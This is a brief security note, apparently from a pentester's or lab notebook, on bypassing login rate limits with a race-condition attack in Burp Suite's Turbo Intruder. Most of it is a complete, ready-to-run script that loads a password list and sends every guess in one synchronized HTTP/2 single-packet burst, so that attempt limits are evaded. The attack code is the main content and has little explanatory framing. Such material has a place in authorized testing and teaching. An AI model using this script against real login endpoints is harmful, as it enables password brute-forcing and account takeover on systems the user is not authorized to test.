# Using Turbo Intruder for Race condition fuzzing limit bypass

![image.png](Using%20Turbo%20Intruder%20for%20Race%20condition%20fuzzing%20li/image.png)

Injection point marked as `%s` , dictionary opened in a script

```bash
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for word in open('/tmp/pwds'):
        engine.queue(target.req, word.rstrip(), gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```